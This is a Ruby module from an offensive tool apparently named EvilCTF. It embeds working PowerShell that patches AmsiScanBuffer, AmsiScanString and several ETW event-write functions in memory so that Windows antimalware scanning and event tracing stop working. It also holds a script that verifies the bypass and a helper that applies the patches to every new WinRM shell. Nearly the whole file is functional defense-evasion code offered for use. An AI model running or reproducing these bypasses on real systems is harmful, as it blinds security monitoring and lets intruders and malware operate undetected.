# frozen_string_literal: true

require_relative 'execution'

module EvilCTF
  # AMSI/ETW bypass scripts and the central per-shell applier.
  #
  # Extracted from EvilCTF::Tools (the "Consolidate bypass scripts" todo):
  # the scripts are PowerShell text with no dependency on the tool
  # catalog, and every shell-creation path funnels through Bypass.apply.
  module Bypass
    # AMSI bypass script
    BYPASS_4MSI_PS = <<~PS
      try {
        $kernel32 = 'using System; using System.Runtime.InteropServices; public class kernel32 { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); }'
        Add-Type -TypeDefinition $kernel32 -ErrorAction SilentlyContinue

        $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
        if ($amsiDll -eq [IntPtr]::Zero) {
          "[!] AMSI bypass failed: amsi.dll not loaded"
        } else {
          $patch = [Byte[]] (0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0xC3)
          $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
          if ($scanBuffer -ne [IntPtr]::Zero) {
            $oldProtect = 0
            [kernel32]::VirtualProtect($scanBuffer, [uint32]13, 0x40, [ref]$oldProtect) | Out-Null
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 13)
            "[+] AmsiScanBuffer patched"
          } else {
            "[!] AMSI bypass warning: AmsiScanBuffer not found"
          }

          # Fallback: also patch AmsiScanString (newer Windows builds)
          $scanString = [kernel32]::GetProcAddress($amsiDll, "AmsiScanString")
          if ($scanString -ne [IntPtr]::Zero) {
            $oldProtectString = 0
            [kernel32]::VirtualProtect($scanString, [uint32]13, 0x40, [ref]$oldProtectString) | Out-Null
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanString, 13) | Out-Null
            "[+] AmsiScanString patched as fallback"
          }
        }
        "[+] AMSI bypass routine completed"
      } catch {
        "[!] AMSI bypass exception: $($_.Exception.Message)"
      }
    PS

    # ETW bypass script
    ETW_BYPASS_PS = <<~PS
      try {
        $kernel32 = 'using System; using System.Runtime.InteropServices; public class kernel32 { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); }'
        Add-Type -TypeDefinition $kernel32 -ErrorAction SilentlyContinue

        $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
        if ($ntdll -eq [IntPtr]::Zero) {
          "[!] ETW bypass failed: ntdll.dll not loaded"
        } else {
          # Patch only the most stable ETW exports to reduce provider-host crashes.
          $funcs = @("EtwEventWrite", "EtwEventWriteTransfer", "EtwEventWriteFull", "EtwEventWriteEx")
          $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3) # xor rax,rax ; ret
          $patchLen = [uint32]$patch.Length
          $patched = 0

          foreach ($f in $funcs) {
            $addr = [kernel32]::GetProcAddress($ntdll, $f)
            if ($addr -ne [IntPtr]::Zero) {
              $old = 0
              [kernel32]::VirtualProtect($addr, $patchLen, 0x40, [ref]$old) | Out-Null
              [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
              $patched++
            }
          }
          "[+] ETW patch-only bypass completed (patched funcs: $patched)"
        }
      } catch {
        "[!] ETW bypass exception: $($_.Exception.Message)"
      }
    PS

    # Windows version-aware bypass selector
    BYPASS_DETECTION_PS = <<~PS
      $osBuild = (Get-CimInstance Win32_OperatingSystem).BuildNumber
      $arch = $env:PROCESSOR_ARCHITECTURE
      $psVersion = $PSVersionTable.PSVersion.Major
      "[+] OS Build: $osBuild | Arch: $arch | PS Version: $psVersion"
      if ([int]$osBuild -lt 9600) {
        "[+] Legacy Windows build detected - using conservative bypass mode"
        "[+] Standard bypass will be used (BYPASS_4MSI_PS + ETW_BYPASS_PS)"
      } elseif ([int]$osBuild -ge 22000) {
        "[+] Windows 11/Server 2022+ detected - using enhanced bypass"
        "[+] Enhanced AMSI/ETW routines enabled by default constants"
      } else {
        "[+] Windows 10/Server 2016/2019 detected - using standard bypass"
        "[+] Standard bypass will be used (BYPASS_4MSI_PS + ETW_BYPASS_PS)"
      }
    PS

    # Post-bypass verification script
    BYPASS_VERIFICATION_PS = <<~PS
      # Verify AMSI bypass
      $amsiResult = 0
      try {
          $null = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
          $amsiType = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
          if ($amsiType) {
              $amsiResult = $amsiType.GetMethod('ScanString', [Reflection.BindingFlags]'NonPublic, Static').Invoke($null, @('test', [Ref]([Int32]::MinValue)))
              if ($amsiResult -eq 0x80070007) {
                  "[+] AMSI bypass verified (return code: 0x80070007)"
              } else {
            "[!] AMSI bypass failed (return code: 0x{0:x})" -f $amsiResult
              }
          }
      } catch {
          "[+] AMSI bypass status unknown (AmsiUtils not found)"
      }
      # ETW verification is informational in patch-only mode.
      "[+] ETW bypass verification: patch-only mode enabled"
      "[+] Bypass verification complete"
    PS

    # Central per-shell bypass applier.
    #
    # The AMSI/ETW patches are in-memory and scoped to the PowerShell
    # process that owns a shell — every new WinRM shell (reconnects,
    # TUI extra sessions, adapter shells) gets a fresh process and must
    # re-apply them. All shell-creation paths call this instead of
    # duplicating script execution.
    def self.apply(shell, amsi: true, etw: true, verify: false, verbose: true)
      results = {}
      if amsi
        amsi_result = EvilCTF::Execution.run(shell, BYPASS_4MSI_PS, timeout: 60)
        results[:amsi] = amsi_result.ok
        results[:amsi_output] = amsi_result.output.to_s
      end
      if etw
        etw_result = EvilCTF::Execution.run(shell, ETW_BYPASS_PS, timeout: 60)
        results[:etw] = etw_result.ok
        results[:etw_output] = etw_result.output.to_s
      end
      if verify
        verify_result = EvilCTF::Execution.run(shell, BYPASS_VERIFICATION_PS, timeout: 30)
        results[:verification_output] = verify_result.output.to_s
      end
      puts "[*] Per-shell bypass applied: AMSI=#{results.fetch(:amsi, 'skipped')} ETW=#{results.fetch(:etw, 'skipped')}" if verbose
      results
    rescue StandardError => e
      puts "[!] Per-shell bypass failed: #{e.class}: #{e.message}" if verbose
      { amsi: amsi ? false : nil, etw: etw ? false : nil, error: e.message }
    end
  end
end
